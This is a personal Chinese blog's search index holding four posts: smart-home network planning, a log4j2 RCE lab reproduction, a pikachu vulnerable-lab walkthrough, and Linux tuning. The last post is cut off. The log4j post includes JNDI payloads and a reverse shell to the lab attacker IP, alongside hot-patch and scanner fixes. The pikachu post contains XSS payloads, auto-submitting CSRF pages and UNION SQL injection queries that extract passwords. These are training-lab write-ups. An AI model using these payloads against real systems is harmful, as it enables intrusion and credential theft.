<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[智能家居构建记录]]></title>
    <url>%2F2024%2F06%2F19%2F%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85%E6%9E%84%E5%BB%BA%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[前言好久好久，没有打开hexo了，离开信息安全行业已经一年有余了，这个博客最后一篇文章截至2021年，那一篇log4j2 RCE漏洞复现… 再次打开hexo，我已经忘记如何开启后台服务，也忘记了如何写Markdown，想想真的是可悲，人生总是有些出其不意，又有些无可奈何。 为什么要写这篇文章呢？今天（2024年6月19日）在研究DDNS如何实现时，想到了2018年跟随我入行信息安全的这个域名loongeyes.cn，想到了我这尘封许久的博客。转念一想，最近在研究如何在新房中实现智能家居，我何尝不将这个过程记录下来，原因有以下几点： 一来是总结我的经验，供我以后参考。 二是如果有人还记得这个博客的话，能够为他人提供经验，我会感到非常高兴。 三是，多年以后，如果我翻出来这些文章，我想知道我当时是一种什么心情…哈哈…… 还有一点，离开信息安全这个行业这么久，其实我已经差不多被这个行业所抛弃了，我现在唯一剩下的，也就是为了满足自己的生活、工作需求而有些动力去研究技术了，目前我所处的圈子，完全找不到志同道合的人。 我希望，借此机会，能够静下心来研究我想研究的技术，多多少少找回之前的我… 说了这么多，该步入正题了 智能家居行业智能家居，是什么时间兴起的？我也不知道。可能是李克强总理提出“互联网+”的概念时，也可能是小米生态链的一步步构建时，还可能是5G的全面商用。社会的一步步发展，导致智能家居行业自然而然出生，逐步发展。我不想去探究这个问题，我只想在我的生活中，享受科技带来的乐趣。（果然，离开信息安全行业太久，我的信息安全意识有所下降，如果是之前，我宁愿保证安全，不愿意去冒险尝试有危机的新鲜科技事物，哈哈…） 智能家居现状目前来看，经过我一段时间的了解，当前智能家居行业的现状是：以万物互联为核心，将家庭中的各类设备连接网络，实现通过语音、手机操控家庭中各类电器，从而实现一部分懒人效果。 那可操控的家庭内设备有哪些呢？其实主要就是，灯类、窗帘、各类家用电器（电视、冰箱、洗衣机、扫地机器人、晾衣架、净水器、空调、洗碗机、蒸烤箱…）、乃至汽车（特斯拉、小米…） 将这些设备集成到一种生态中，通过语音或者一个手机APP操控所有的可用电器，再通过配置自动化场景，实现不同行为执行不同的操作命令。这是网络上一些博主宣传智能家居的核心内容。 我为什么要做智能家居很简单，因为我懒……哈哈哈哈哈 智能家居未来设想多年以前，我就希望能够实现《钢铁侠》中贾维斯这个角色，当然，回归现实，这是一个必定会实现的事情，但并不是现在或者说五至十年内能够实现的。ChatGPT发布时，引起了轩然大波，这是人工智能行业中划时代的一次事件，多年以后，此事件必然会载入史册。 实现“贾维斯”，仍然是我希望做到的事（虽然，我应该什么也不会做…） 我的智能家居回到现实，回到我本身，我将讲述一下我做智能家居的需求，以及我为之做的工作，并将此过程通过时间线的方式记录下来，这个过程应该会很长，可能持续装修至入住之后很长的一段时间，我希望能够坚持记录下来。 说来惭愧，我所有的想法都基于其他人已经实现的想法，我这人没有什么创新能力，一个做软件出身的计算机行业从业者，也没有自己做电器控制板的能力，就这样了。也许在以后的生活中，能够结合自己的生活冒出一些新奇的想法，那是以后的事情了。 我的智能家居需求 实现灯光控制 实现窗帘控制 实现中央空调、扫地机器人、洗衣机等等家用电器的远程控制 根据自身需求，配置各类自动化场景，实现某些情景模式，比如回家模式、离家模式、观影模式、工作模式、游戏模式等等 我的需求很简单，我并不需要实现什么“人来灯亮、人走灯灭”的场景，我觉得这是一个很奇怪的事情… 智能家居生态选择现有的智能家居生态有很多很多，有大品牌，也有小厂商，有众所周知的，也有鲜为人知的，我不去完整的介绍各类智能家居生态，我也没有精力去了解这些，我只说些我知道的，和我所考虑的。 Homekit苹果的智能家居生态，我是一个资深的苹果产品使用者，我大部分电子设备都是苹果产品。在购买一整套苹果设备之前（大概是2019、2020年时吧），我就在考虑生态的问题，为了体验，我购入了一套苹果设备。在真正进行智能家居构想落地之前，我曾经想做Homekit智能家居生态，但真正要落地之时，也就是近期吧，我觉得苹果的产品力一直在下降，反而国内以小米为核心的米家生态正在大跨步的崛起，虽然在平板电脑、笔记本电脑这些方面，苹果仍然是行业标杆，但在智能家居这个行业中，米家生态的多样性、可玩性要远远高于Homekit。 总结来看，Homekit生态闭塞，支持设备少，设备价格贵，而且，也许三年之后，我会抛弃苹果设备。 华为华为，虽然他一直被推在民族大义的前沿，但作为一个消费者，华为的任何设备我都没有买过，原因很简单，性价比太低。 华为的智能家居生态，与Homekit基本一致，生态闭塞，可选择性少，性价比低，基本不具备可玩性。 米家雷军是一个有些值得敬佩的人，从将智能手机的价格打下来，到布局并构建自己的智能家居生态，虽然在此之中，他并没有多么耀眼，但他所构建的庞大科技帝国是有目共睹的。 米家，性价比比其他生态要高，生态开放，有众多下游厂商，可接入各个家电行业部分智能设备，可玩性高，构建较其他简单。 欧瑞博这个品牌，我从来没听说过，只是最近在逛红星美凯龙等家装城时，发现有这么一家做线下智能家居的品牌。大概了解了一下，品牌应该是挺大，但知名度有点低（只是对我自己来说啊），主要做全屋智能家居构建，包括网络构建。跟店里的导购聊了一下，感觉啥也不懂，像我这种有点想自己折腾的人来说，完全不合适，所以我不考虑。 其他品牌不了解了，也不想了解了… 说了这么多，很明显，我要做的智能家居生态，就是米家。 其实，我是想做Homekit与米家双兼容的生态，因为本身我目前是苹果用户，但米家生态可玩性更高，所以我想双兼容。经过思想斗争与对技术的了解，我决定，购买家装，以米家为主，后续可以通过其他手段进行双方融合。 我的智能家居构建说了一堆，终于到重点了，我都写累了… 2024年6月19日刚刚交房两周，还没有开始动工。 动工的第一步就是砸墙，改水电。经过两周的构思，基本理清在哪留水、在哪留电、在哪布网。 水的事情其实还好，用水的地方其实并不多，而且开发商做的水基本问题不大。 电的事情比较多，因为家电众多，要整明白买什么家电，大概尺寸，才能知道电要放在哪个位置，放几个。这事，真的费脑子。 我先说网的事情吧，这个比较在行，而且，做智能家居，网络是必须的！ 网络弱电箱在主卧，开发商在每个房间布好了网络接口面板，并在电视背景墙、主卧布置了同轴电缆电视线。有这么几个问题： 同轴电缆已经是被淘汰的技术了，目前家用电视已经不使用此传输介质 房子客厅开间7米，计划在客厅中部加书桌，需要网和电 餐厅、厨房位置网络覆盖较弱，需增加网口 开发商已经预埋网线，但是看着好low，我都没仔细看是几类网线… 解决方案： 目前，家庭网络架构，有什么mash组网，这个玩意又分有线组网、无线组网。价格还低，网上说是几百块钱就能解决。我不了解这个，因为要在家中不同位置放置路由器，实现信号全覆盖，说实话，很丑，做不到无感。还有就是AC+AP模式，这是大型企业的组网方式，在家庭中，有些浪费了，但好处是基本隐藏，缺点是价格贵，根据AP点位的多少，基本在两千块钱以上。 这两种模式都需要预埋网线。 我选择用AC+AP模式。 共设计6个AP点位，还有一个IPTV点位，即需要7条网线从弱电箱到相应的点位。具体点位给张图吧 红色星星是AP点位，橙色星星是IPTV点位 基本做到了全屋网络覆盖，说实话，有些冗余，但是既要利用开发商已经做的点位，又要减少施工量，最终也就这结果了。其中餐厅、书桌为新加点位，其他位置均为开发商布线点位。 各点位利用构想如下： 电视背景墙AP点位：发射无线信号，网口用于后期智能家居中枢网关有线连接 电视背景墙IPTV点位：普通网络接口面板，提供一个网口，用于后期连接IPTV机顶盒 书桌AP点位：发射无线信号，网口后期可能用于NAS有线连接 其他点位：发射无线信号 既然要做AC+AP模式，那就需要AC交换机，具备POE供电能力。还有AP面板，用于发射无线信号，并提供一个网口。 买了TP-LINK品牌（家用可以了，要不我就买华三了） 交换机型号是TL-R479GPE-AC，叫做POE·AC一体化企业VPN路由器。共九个网口，其中一个WAN口，八个POE供电LAN口。 AP面板型号是TL-XAP3002GI-PoE，一共6个。（一开始买了7个，后来发现电视背景墙IPTV点位只需要一根网线就行，不用发射无线信号，因为旁边有个AP面板，也不用供电，果断退了一个，直接省300元） 1个AC+6个AP面板+1个普通网络接口面板，花费了2546.24元 AC交换机共九口，各口利用如下： WAN口：连接光猫LAN口 6个LAN口：连接各AP点位 剩余2个LAN口：可用于IPTV，也可空余（光猫IPTV口不经过交换机，直接通过网线连接机顶盒也可）。浪费啊，为什么没有7口交换机！！ 预埋网线 不知道开发商预埋的是几类网线，反正很low！ 自己买了超六类（是CAT6A！！！！！看了网上好多人被坑了，买了CAT6E，俗称假超六）网线，绿联的，双屏蔽双绞线。超六类线默认支持万兆网络（虽然现在也就用个300兆的网，用千兆就够了），因为家至少要住十年、二十年，为了以后网络提速，直接埋点好的吧。 把开发商的线换成我自己的，同轴电缆扔到垃圾桶，换超六类网线。 配套买了超六类水晶头20个，还有可以压五、超五、六、超六、七、八类网线的网线钳（已经预想到压网线把手干废了，这网线看着就硬） 同时，买了烽火品牌的2芯3铜线的皮线光纤，跟网线一起穿到7个点位，这玩意，也许二十年之后能用上（那玩意叫FTTR，目前是运营商的噱头而已） 其实埋网线这事我纠结了一晚上，是六类线还是超六类线，埋不埋光纤。最后想想，以现在的眼光看，还是最好一步到位吧，谁知道以后是什么情况呢，省的以后麻烦。哦，对了，上面的AC+AP都是千兆的，因为这玩意好换，网线是在地里的，不好换。 网线、水晶头、网线钳、光纤花费704.76元 对了，换了弱电箱 开发商的弱电箱属实小点，质量也不好，也不好看。买了公牛的弱电箱，自带插座，带分位模块。准备把光猫和交换机放弱电箱，需要电源。为了美观，需要布置好其中的位置。 弱电箱花费106.77元 行了，网络的事情，目前就是这样了，买了所有需要的东西，就等着开始改水电一起布线了，至于安装交换机和面板，等后期大概硬装大概结束再说吧。 好了，已经晚上十点半了，我累了，今天不写了，下次再说！ 下次写对于电的构思、水的构思、智能家居的构思，如果已经开始动工了，那就也写一下。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Apache log4j2 rce（CVE-2021-44228）]]></title>
    <url>%2F2021%2F12%2F13%2FApache-log4j2-rce%EF%BC%88CVE-2021-44228%EF%BC%89%2F</url>
    <content type="text"><![CDATA[漏洞复现靶机地址：10.211.55.8 CentOS主机，安装docker，使用docker部署靶机环境 攻击机地址：192.168.43.241 配置靶机下载1docker pull vulfocus/log4j2-rce-2021-12-09 启动1docker run -tid -p 38080:8080 vulfocus/log4j2-rce-2021-12-09 将靶机的8080端口映射为CentOS主机的38080端口 漏洞测试漏洞验证漏洞存在于hello目录下，直接请求此目录会产生如下提示 使用DNSLog验证漏洞是否存在 使用hackbar工具修改请求包 漏洞利用的参数为payload 漏洞验证代码为${jndi:ldap://xxx.dnslog/exp} 漏洞验证结果 请求结果 DNSLog收到解析结果 证明漏洞存在 远程命令执行启动JNDIExploit工具 1java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.43.241 远程创建文件 首先进入docker靶机 1docker exec -it 7e12c /bin/bash 查看/tmp目录下文件 使用BurpSuite修改请求数据包并发送 请求字段为payload=${jndi:ldap://192.168.43.241:1389/TomcatBypass/Command/Base64/dG91Y2ggL3RtcC9hYWE%253d} 其中dG91Y2ggL3RtcC9hYWE%253d为touch /tmp/aaa命令经过base64+两次url编码形成 查看JNDIExploit工具 发现已经有数据流量通过 查看靶机/tmp目录 发现已经成功创建aaa文件 GetShell 攻击机使用nc开启7777端口的监听 1nc -l 7777 编写反弹shell命令 1bash -i &gt;&amp; /dev/tcp/192.168.43.241/7777 0&gt;&amp;1 修改请求包并发送 请求字段为payload=${jndi:ldap://192.168.43.241:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252bJiAvZGV2L3RjcC8xOTIuMTY4LjQzLjI0MS83Nzc3IDA%252bJjE%253d} 其中YmFzaCAtaSA%252bJiAvZGV2L3RjcC8xOTIuMTY4LjQzLjI0MS83Nzc3IDA%252bJjE%253d为bash -i &gt;&amp; /dev/tcp/192.168.43.241/7777 0&gt;&amp;1经过base64+两次url编码形成 查看JNDIExploit工具流量 查看nc监听 已成功获取反弹shell 火绒热补丁修复Linux验证漏洞存在 部署热补丁 确保存在漏洞主机配置好java环境变量 1vim ~/.bash_profile 在文件末尾添加如下语句 1234export JAVA_HOME=JDK的目录export JRE_HOME=JRE的目录export PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib/dt.jar 使文件生效 1source ~/.bash_profile 火绒热补丁程序下载地址 1https://bbs.huorong.cn/thread-96320-1-1.html 将火绒补丁程序放置于存在漏洞主机中，解压 1unzip CVE-2021-44228-mitigator-Linux-v1.1.zip -d 1 进入解压目录，授于.sh文件执行权限 12cd 1/chmod 744 CVE-2021-44228_mitigator.sh 执行 1./CVE-2021-44228_mitigator.sh 出现上图说明存在漏洞，并自动安装了热补丁，无需重启 注意：热补丁在重启主机后失效，重启后需重新运行程序 验证漏洞是否修复 经过较长时间等待后，发现无任何返回值，漏洞已不存在 长亭牧云本地检查工具注意：本工具基于本地log4j2组件所属jar包版本进行检查，若使用上面”火绒热补丁修复”方案，使用本工具仍可检查到存在漏洞 下载地址1https://log4j2-detector.chaitin.cn/ 根据不同类型主机选择不同版本下载即可 Linux 下载本地检查工具后，放置于需要检查的主机中，解压 1tar xzvf log4j2_local_scanner_linux_amd64.v3.tar.gz 执行 1./log4j2_local_scanner_linux_amd64.v3 # 默认为全部jar文件，其他命令参数参考此工具官方网站 程序会列出存在漏洞的jar包及其路径 以上图为例： /root/demo/demo.jar中包含log4j-core-2.14.0.jar，属于存在漏洞的版本。此demo.jar为本地测试靶机环境，并且已通过“火绒热补丁修复”方案进行修复（此工具仍可检查到） 其他检查结果项为docker中使用的log4j-core-2.14.0.jar组件，需按照docker官方给出的修复方案进行修复（类似的，若业务系统中使用了某些开源软件或商业软件，具体修复方法应遵循开源社区或官方出具的方案）]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pikachu]]></title>
    <url>%2F2020%2F08%2F23%2Fpikachu%2F</url>
    <content type="text"><![CDATA[暴力破解基于表单的暴力破解 验证码绕过（on server） 抓包 修改账号密码，不修改验证码 提示账号或密码错误，未提示验证码错误 修改验证码 说明验证码无条件不刷新，无条件不刷新是指在某一时间段内，无论登录失败多少次，只要不刷新页面，就可以无限次的使用同一个验证码来对一个或多个用户帐号进行暴力猜解 对账号密码进行暴力破解 验证码绕过（on client） 尝试登录 此时抓包无法获取请求包，说明验证码在客户端验证，验证成功之后才向服务器发起请求 抓包 输入正确的验证码进行抓包 虽然请求包中包含验证码字段，但并不在服务器进行验证，对账号密码进行暴力破解即可 暴力破解 token防爆破 抓包 发现请求包中出现token字段 发起请求，查看响应包 发现响应包中存在一个token字段，此token为下一次请求所使用的token值 将请求包中的token改为下一次所用的token值 对其进行暴力破解 对密码的破解使用普通列表 对token的字典需从响应包中获取 设置请求的线程数为1 设置Grep-Extract处 获取token值，并且复制当前响应包的token值 设置第二个字典，粘贴上一步复制的token值 开始破解 XSS反射型XSS（get） 尝试输入代码 发现输入框限制了输入字符限制 可通过修改html代码来去除限制 可直接修改url中的参数绕过限制 反射型XSS（post）先进行登录，登录后可进行XSS攻击 存储型XSS DOM型XSS 尝试进行攻击,失败 查看网页元素 可发现注入语句被填充在a标签中，成为链接 根据规则进行标签的闭合，使用a标签的单击事件 DOM型XSS-x 尝试攻击，出现两层链接 查看页面元素，同样被包含在标签中 将标签进行闭合，触发攻击，&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt; XSS盲打盲打只是一种惯称的说法，就是不知道后台有没有xss存在的情况下，不顾一切的输入xss代码在所有的输入框中，尽可能多的尝试xss语句。 xss盲打是指在攻击者对数据提交后展现的结果未知的情况下，网站采用了攻击者插入了带真实攻击功能的xss攻击代码（通常是使用script标签引入远程的js）的数据。当后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发xss来实现攻击者预定好的真实攻击功能 在所有的输入框中输入xss代码 登录后台 触发攻击 XSS之过滤 输入攻击语句 发现注入语句被过滤 采用大小写方式进行绕过 XSS之htmlspecialcharsPHP htmlspecialchars()函数把预定义的字符转换为 HTML 实体 &amp;（和）成为&amp;amp; &quot;（双引号）成为&amp;quot; &#39;（单引号）成为&amp;#039; &lt;（小于）成为&amp;lt; &gt;（大于）成为&amp;gt; 尝试输入特殊字符 发现过滤了&quot;与&gt; 可以在攻击语句中避免使用过滤字符，&#39; onclick=&#39;alert(/xss/)&#39; XSS之href输出 输入攻击语句 发现攻击语句被填充到herf属性中 可以使用js语句来进行执行，javascript:alert(/xss/) XSS之js输出 尝试输入攻击语句，无任何返回 尝试输入任意语句，得到返回 发现所输入的语句被放到代码中进行判断 1234567891011&lt;script&gt;$ms=&apos;1111&apos;;if($ms.length != 0)&#123; if($ms == &apos;tmac&apos;)&#123; $(&apos;#fromjs&apos;).text(&apos;tmac确实厉害,看那小眼神..&apos;) &#125;else &#123; //alert($ms); $(&apos;#fromjs&apos;).text(&apos;无论如何不要放弃心中所爱..&apos;) &#125;&#125;&lt;/script&gt; 根据规则进行代码闭合，&#39;&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; 1234567891011&lt;script&gt;$ms=&apos;&apos;&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&apos;;if($ms.length != 0)&#123; if($ms == &apos;tmac&apos;)&#123; $(&apos;#fromjs&apos;).text(&apos;tmac确实厉害,看那小眼神..&apos;) &#125;else &#123; //alert(&apos;&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;); $(&apos;#fromjs&apos;).text(&apos;无论如何不要放弃心中所爱..&apos;) &#125;&#125;&lt;/script&gt; CSRFCSRF（get） 首先登录一个账号 修改个人信息，并抓包 发现页面采取get的方式进行参数传递 构造恶意链接 http://10.211.55.3/vul/csrf/csrfget/csrf_get_edit.php?sex=%E5%A5%B3&amp;phonenum=123123123&amp;add=qwe1&amp;email=123%40163.com&amp;submit=submit 在某一用户登录的情况下，诱使其访问恶意链接，可导致其遭受CSRF攻击 也可构造恶意页面，增强伪装 1234567 &lt;html&gt; &lt;body&gt; &lt;img src=&quot;http://10.211.55.3/vul/csrf/csrfget/csrf_get_edit.php?sex=%E5%A5%B3&amp;phonenum=123123123&amp;add=qwe1&amp;email=123%40163.com&amp;submit=submit&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; &lt;h1&gt;error&lt;/h1&gt; &lt;h2&gt;404&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; 诱使登录用户进行访问 CSRF（post） 登录用户，修改个人信息，抓包 发现参数采用post的方式进行传递 构造恶意页面，发起恶意请求 123456789101112131415161718 &lt;html&gt;&lt;head&gt; &lt;script&gt; window.onload = function() &#123; document.getElementById(&quot;postsubmit&quot;).click(); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;http://10.211.55.3/vul/csrf/csrfpost/csrf_post_edit.php&quot;&gt; &lt;input id=&quot;sex&quot; type=&quot;text&quot; name=&quot;sex&quot; value=&quot;body&quot; /&gt; &lt;input id=&quot;phonenum&quot; type=&quot;text&quot; name=&quot;phonenum&quot; value=&quot;123456789&quot; /&gt; &lt;input id=&quot;add&quot; type=&quot;text&quot; name=&quot;add&quot; value=&quot;usa&quot; /&gt; &lt;input id=&quot;email&quot; type=&quot;text&quot; name=&quot;email&quot; value=&quot;vince@pikachu.com&quot; /&gt; &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 在某一用户登录的情况下，诱使其访问恶意页面，造成CSRF攻击 CSRF（token）登录用户，修改个人信息，抓包,发现在请求中包含随机的token值 无法利用 SQL注入数字型注入（post） 抓包 判断是否存在注入 输入单引号 输入1 and 1=1 输入1 and 1=2 判断查询语句的字段数 说明只有两个字段 获取数据库名 获取表名 information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式 其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如：数据库名，数据库的表，列的数据类型与访问权限等 information_schema数据库的table表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个数据库，表类型，表引擎，创建时间等信息 1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;pikachu&#39; 获取数据库中users表中的列 information_schema数据库的columns表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息 1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; 获取数据记录 1 union select group_concat(id,username),group_concat(password) from users]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>pikachu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux桌面美化]]></title>
    <url>%2F2019%2F06%2F17%2FLinux%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%2F</url>
    <content type="text"><![CDATA[系统安装Ubuntu 18.04.2 LTS 操作系统初始配置 打开“软件和更新” 更改Ubuntu软件更新源，使系统自动选择当前网络下最好的更新服务器 登陆Ubuntu云端账号 当登陆Ubuntu云端账号后，勾选Canonical Livepatch 用于：当官方发布需进行重启的安装补丁时，Livepatch可保证不中断当前工作、不重启的情况下安装补丁 安装英伟达显卡驱动 保存更改后的配置 操作系统美化 查看当前Gnome桌面的版本 更新软件源 1sudo apt update 安装优化(gnome-tweaks) 1sudo apt install gnome-tweaks 安装chrome-gnome-shell 1sudo apt install chrome-gnome-shell 浏览器访问 1https://extensions.gnome.org 安装浏览器扩展 安装失败 解决方法： 浏览器访问about:config 找到xpinstall.signatures.required，修改值为false 主题 安装浏览器扩展User Themes 访问https://www.gnome-look.org 搜索McMojave，下载 将McMojave-light.tar.xz 解压后剪切至当前用户家目录下的.themes/(需新建)目录中 设置tweaks 修改应用主题为Mojave-light 则系统主题已被修改 图标 访问https://www.gnome-look.org，搜索cupertino icons，下载 将Cupertino.tar.xz解压后剪切至当前用户家目录下的.icons/(需新建)目录中 设置tweaks 修改图标为Cupertino 则图标样式已被修改 鼠标指针 访问https://www.gnome-look.org，搜索OSX EI Capitan，下载 将175749-OSX-ElCap.tar.bz2解压后的目录下的OSX-ElCap剪切至当前用户家目录下的.icons/目录中，进入此目录，执行 1./install.sh 选择3，安装鼠标主题 设置tweaks 修改光标为OSX-ElCap Gnome shell主题 访问https://www.gnome-look.org，搜索macOS MOJAVE，下载 将OSX.for.Dash.to.PANEL.tar.xz解压，进入此目录 进入FONT目录，打开两个字体文件，点击安装 进入3.26-3.28目录(此名称标识了Gnome的版本)，将其中的Mojave剪切至当前用户家目录下的.themes/中 将.themes/Mojave-light/gnome-shell/assets/下的activities.svg复制至.themes/Mojave/gnome-shell/assets/中 打开.themes/Mojave-light/gnome-shell/目录下的gnome-shell.css文件 搜索#panel #panelActiv 将对应配置内容复制到.themes/Mojave/gnome-shell/目录下的gnome-shell.css文件对应位置上 设置tweaks 修改shell为Mojave 修改窗口标题、界面、文档字体为san francisco 常用gnome扩展插件访问https://extensions.gnome.org，安装NetSpeed、OpenWeather plank Dock 安装plank 1sudo apt install plank 卸载Ubuntu自带Dock 1sudo apt remove gnome-shell-extension-ubuntu-dock 将plank加入开机自启 设置tweaks 隐藏侧边Dock 访问https://extensions.gnome.org，安装Hide Dash X即可 重启操作系统 访问https://www.gnome-look.org，搜索Transparent Plank Theme，下载 将Transparent 2.0.tar.gz解压后剪切至当前用户家目录下的.local/share/plank/themes目录中 设置plank主题 GDM主题(锁屏界面) 访问https://www.gnome-look.org，搜索High Ubunterra，下载 将High_Ubunterra_2.3(noPass).tar.xz解压，进入解压目录，执行 12sudo chmod +x install.sh./install.sh 按Alt+F2，输入r，回车 设置桌面壁纸与锁屏壁纸 桌面 锁屏 任务切换动画效果 访问https://extensions.gnome.org，安装Cover-flow Alt-Tab 设置tweaks Plymouth主题(开机引导画面) 访问https://www.gnome-look.org，选择Plymouth Themes类型，选择合适的主题 按照主题配置文档进行设置即可 conky系统信息监控与展示 桌面工具，展示性编程文件 CPU、内存、硬盘性能参数 结合其他工具获取系统信息(硬件温度、音乐播放、站外资源请求等) 配合lua、python开发语言实现复杂功能 需要大量配置文件的编辑优化 许多效果需显卡驱动支持 安装1sudo apt install conky-all conky美化主题https://www.deviantart.com/custom-linux/gallery/39357745/Conky-Themes 操作系统性能优化优化原则 完全不优化或过度优化都不可取 笔记本用户重点关注电池、SSD硬盘寿命 SSD硬盘优化SSD分区对齐目前主流Linux操作系统已自动对齐文件系统和分区–页面大小4096字节 激活SATA驱动器的AHCI特性某些BIOS/UEFI只有在激活此特性后才可正确识别SSD硬盘 Advanced–Integrated Peripherais–AHCI 减少写操作频繁的写操作会磨损SSD over-provisioning通过保存1/4未分配的空间提高SSD的性能和寿命(最大不超过10G) 较新的SSD内置预留空间(用户无法访问)，不再需要over-provisioning 文件系统推荐使用ext4文件系统 ext4日志不会产生较多的写操作，日志对于系统崩溃恢复非常重要，建议保留 不建议使用BTRFS文件系统，它会导致大量的写操作 禁用读文件时访问时间戳的写操作系统在读文件时会对文件的时间戳进行写操作，但并没有实际的用处 为除swap之外的每个分区增加noatime选项 1234sudo vim /etc/fstab增加noatime,errors=remount-ro 0 1 重启生效 定期清理硬盘TRIM默认每周启动一次，对硬盘进行清理 查看是否支持TRIM1sudo hdparm -I /dev/sda | grep TRIM 查看TRIM的运行状态1sudo systemctl status fstrim 手动执行TRIM1sudo fstrim -v / 设置每天清理1234567sudo mkdir -v /etc/systemd/system/fstrim.timer.dsudo touch /etc/systemd/system/fstrim.timer.d/override.confgedit admin:///etc/systemd/system/fstrim.timer.d/override.conf[Timer]OnCalendar=OnCalendar=daily CPU微码用于提高性能或为安全补丁 intel CPU1sudo apt install intel-microcode AMD CPU1sudo apt install amd64-microcode 交换分区/文件Ubuntu操作系统默认当内存剩余60%时就将内存中的数据写入SWAP中，这样会导致运行缓慢。减少使用SWAP可提高性能 通过修改swappiness内核参数(0-100)来决定RAM写入SWAP的百分比 查看当前swappiness内核参数设置 1cat /proc/sys/vm/swappiness 修改swappiness内核参数设置 1234sudo vim /etc/sysctl.conf增加vm.swappiness=10 硬盘缓存正常情况下，程序等待写硬盘结束后，才进行下一步操作 若数据只写入缓存就进行下一步操作，则速度提升。但存在数据丢失的风险 开启此功能 1Disk工具--Drive Settings--Enable Write Cache 提升显示效果(防止撕裂)针对英伟达显卡 1234sudo vim /etc/default/grub修改为GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet nvidia-drm.modeset=1&quot; 生效 12sudo update-grubreboot 验证设置 1xrandr --verbose | grep PRIME Firefox浏览器优化修改Firefox网络缓存将Firefox网络缓存放入RAM，可提高运行速度 访问about:config 禁用Firefox将缓存写入硬盘 搜索browser.cache.disk.enable，将其修改为false 开启Firefox将缓存写入内存 搜索browser.cache.memory.enable，将其修改为true 设置Firefox缓存使用的最大的内存空间 新建integer，参数设置为browser.cache.memory.capacity，值为204800 禁用sessionstoresessionstore：当Firefox意外崩溃后，重新启动后Firefox会进行恢复，这会导致大量的写操作，禁用可提高性能，保护硬盘，但会导致无法进行恢复 访问about:config 搜索browser.sessionstore.interval，修改值为15000000 禁用Firefox无必要的网络访问Firefox会周期请求http://detectportal.firefox.com/success.txt，用于网络探测 访问about:config 搜索network.captive-portal-service.enabled，修改值为false Chrome优化限制Chrome写硬盘settings–Advanced–Privacy–关闭Use a prediction service to load pages more quickly 禁用休眠休眠时磁盘会挂起，会导致大量的写操作，对SSD尤其不利 Ubuntu中默认已禁用休眠 碎片整理Linux无必要进行碎片整理，碎片整理会导致大量的写操作，会短时间内毁坏SSD 优化启动项删除不需要的启动项 将系统隐藏启动项进行显示 1sudo sed -i &apos;s/NoDisplay=true/NoDisplay=false/g&apos; /etc/xdg/autostart/*.desktop 设置启动项 startup applications工具 系统清理 stacer https://github.com/oguzhaninan/Stacer 123sudo add-apt-repository ppa:oguzhaninan/stacer -ysudo apt-get updatesudo apt-get install stacer -y bleachbit 已集成于Ubuntu操作系统中 优化笔记本电池寿命手动优化及其复杂，使用tlp工具进行自动优化 安装 1sudo apt install tlp tlp-rdw 启动优化 1sudo tlp start 查看优化配置 1sudo tlp-stat CPU温度监视sensors工具 安装 1sudo apt install lm-sensors 使用 1sensors 限制inode缓存在Linux上，一个文件由一个inode表示。inode在系统管理员看来是每一个文件的唯一标识，在系统里面，inode是一个结构，存储了关于这个文件的大部分信息。一个inode一般占了128KB或者是256KB 限制inode缓存的代价是某些系统项将在RAM中保留更长的时间，将减少用于一般任务的可用RAM的数量 建议内存大于4GB的计算机限制inode缓存，可提高计算机运行速度 12345gedit admin:///etc/sysctl.conf增加配置# Improve cache managementvm.vfs_cache_pressure=50 /tmp目录/tmp目录用于存放计算机的中间或临时数据 /tmp默认存放在硬盘中，将其存放到内存中会加快运行速度，因会占用内存空间，建议8G以上内存用户设置 将/tmp转至/tmpfs(放入内存) 12sudo cp -v /usr/share/systemd/tmp.mount /etc/systemd/system/sudo systemctl enable tmp.mount &amp;&amp; reboot 查看状态 1systemctl status tmp.mount 取消使用/tmpfs 1sudo rm -v /etc/systemd/system/tmp.mount 无线优化禁用无线芯片电源管理以提高用电为代价，提高速度和无线质量 1234gedit admin:///etc/NetworkManager/conf.d/default-wifi-powersave-on.conf修改wifi.powersave=2 重启生效 开启英特尔无线网卡Tx AMPDU功能前提 英特尔无线芯片运行在iwlwifi驱动程序上 打开Tx AMPDU可提高无线速度(部分芯片可能不稳定) 检查驱动是否为iwlwifi1lsmod | grep iwlwifi 开启提速1echo &quot;options iwlwifi 11n_disable=8&quot; | sudo tee /etc/modprobe.d/iwlwifi11n.conf 删除配置1sudo rm -v /etc/modprobe.d/iwlwifi11n.conf 部分重启/partial rebootLinux如果死机，可尝试partial reboot(按下ctrl+alt+back重启桌面) 配置 1234gedit 